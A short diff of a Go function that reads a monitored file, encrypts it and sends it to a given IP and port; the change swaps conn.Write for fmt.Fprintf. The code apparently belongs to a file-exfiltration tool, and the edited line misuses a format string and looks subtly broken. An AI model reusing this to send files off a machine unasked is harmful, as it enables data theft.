@@ -267,10 +267,11 @@ func monitorFile(ip, filename string, port uint16){
 
 			file, err := ioutil.ReadFile(filename)
 			checkError(err)
-			
+		
+
 			data := encrypt_data(string(file))
 
-			conn.Write(data)
+			fmt.Fprintf(conn, data)
 			return
 		}
 	}
